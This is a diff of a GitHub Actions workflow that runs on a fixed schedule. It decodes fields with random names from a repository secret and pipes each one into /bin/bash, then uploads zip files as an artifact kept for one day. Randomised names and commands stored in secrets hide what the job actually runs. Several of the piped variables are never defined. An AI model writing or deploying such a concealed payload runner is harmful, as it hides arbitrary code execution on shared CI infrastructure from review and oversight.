@@ -1,25 +1,28 @@
 name: songguanxingyi
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '29 4/6 * * *'
-jobs:  # 2558
+    - cron: '51 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: songguanxingyi
         env:
-          seloh9624: ${{ secrets.seloh9624 }}
+          hjalo77: ${{ secrets.hjalo77 }}
         run: |
-          echo $seloh9624 | jq -r .go27 | /bin/bash
-          echo $fhi58 | jq -r .kwgp2 | /bin/bash
-          echo $smajn5768 | jq -r .qkde63 | /bin/bash
-          echo $sle0 | jq -r .zbwj1522 | /bin/bash
-          echo $bkh46771 | jq -r .ey7728 | /bin/bash
-          echo $nmibl68379 | jq -r .n4788 | /bin/bash
-          echo $qo2825 | jq -r .dkgws547 | /bin/bash
-          echo $iarea99137 | jq -r .i055 | /bin/bash
-          echo $pm0716 | jq -r .fqk5649 | /bin/bash
-          echo $grr01671 | jq -r .twemr30 | /bin/bash
+          printf '%s' "$hjalo77" | jq -r .mive148 | /bin/bash
+          printf '%s' "$ts89969" | jq -r .mbu958 | /bin/bash
+          printf '%s' "$k83071" | jq -r .qhv293 | /bin/bash
+          echo $mygfx27 | jq -r .pfs08 | /bin/bash
+          printf '%s' "$gkzjs3147" | jq -r .x157 | /bin/bash
+          printf '%s' "$g2" | jq -r .wagcn8516 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 67ttHKiS
+          path: "*.zip"
+          retention-days: 1
